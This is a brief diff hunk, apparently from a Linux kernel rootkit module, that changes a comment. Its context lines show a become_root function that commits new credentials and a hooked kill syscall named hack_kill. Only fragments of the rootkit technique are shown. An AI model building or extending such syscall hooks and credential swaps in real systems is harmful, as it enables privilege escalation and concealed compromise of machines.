@@ -140,9 +140,7 @@ static void become_root(void)
     commit_creds(proc_creds);
 }
 
-/* define new custom syscalls
- *
- * hacked kill */
+/* define new custom syscall */
 static asmlinkage int hack_kill(const struct pt_regs *regs)
 {
     int sig = regs->si;
